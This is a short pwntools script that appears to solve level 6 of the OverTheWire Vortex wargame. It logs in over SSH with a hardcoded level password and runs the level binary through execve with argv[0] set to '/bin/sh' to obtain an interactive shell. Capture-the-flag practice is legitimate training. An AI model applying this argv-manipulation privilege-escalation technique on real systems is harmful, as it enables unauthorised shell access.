from pwn import *

host = "vortex.labs.overthewire.org"
user = "vortex6"
password = "*uy5qDRb2"
binary = "/vortex/vortex6"

shell = ssh(host=host, user=user, password=password)
sh = shell.run('''
python -c "
import sys, os
os.execve(%r, ['/bin/sh'], {'a':'b'})
"
''' % binary)
sh.interactive()
